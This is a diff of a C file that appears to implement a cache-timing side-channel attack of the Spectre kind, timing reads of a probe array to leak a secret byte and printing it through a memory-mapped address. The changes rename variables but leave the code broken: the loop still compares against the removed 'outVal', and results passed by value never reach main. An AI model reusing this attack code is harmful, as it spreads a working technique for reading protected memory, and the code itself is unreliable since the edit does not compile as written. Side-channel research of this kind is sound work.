@@ -101,13 +101,13 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
 	// and its corresponding stored array value means cache hits.
 	static uint32_t results[RESULT_ARRAY_SIZE];
-	uint8_t outputValue;
+	uint8_t hitIdx;
 	uint32_t hitTimes;
 
 // Memory address for displaying characters (in place of printf)
 volatile char* outputAddr = (char*)0x40002000;
 
-void cacheAttack(uint8_t outIdx, uint32_t outVal){
+void cacheAttack(uint8_t outIdx, uint32_t outTimes){
 
 			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
 			// Read out probeArray and see the hit secret value.
@@ -125,12 +125,14 @@ void cacheAttack(uint8_t outIdx, uint32_t outVal){
 				}
 			}
 
-	outVal = 0;
+	
 	outIdx = 0;
+	outTimes = 0;
+
 	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
 		if (results[i] > outVal){
 			outIdx = i;
-			outVal = results[i];
+			outTimes = results[i];
 		}
 	}
 
@@ -213,7 +215,7 @@ void main(){
 				//default:
 				//	break;
 			}
-			cacheAttack(outputValue, hitTimes);
+			cacheAttack(hitIdx, hitTimes);
 		}
 
 		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
@@ -231,7 +233,7 @@ void main(){
     	*outputAddr = ':';
     	*outputAddr = ' ';
     //	*outputAddr = (char)output[0];// + '0';//
-		*outputAddr = (char)outputValue;
+		*outputAddr = (char)hitIdx;
         *outputAddr = ' ';
         *outputAddr = 'H';
         *outputAddr = 'i';
@@ -239,7 +241,7 @@ void main(){
         *outputAddr = ':';
         *outputAddr = ' ';
     //    *outputAddr = (char)hitArray[0] + '0';
-		*outputAddr = hitTimes + '0';
+		*outputAddr = (char)hitTimes + '0';
         *outputAddr = '\n';
 
 		attackIdx++;
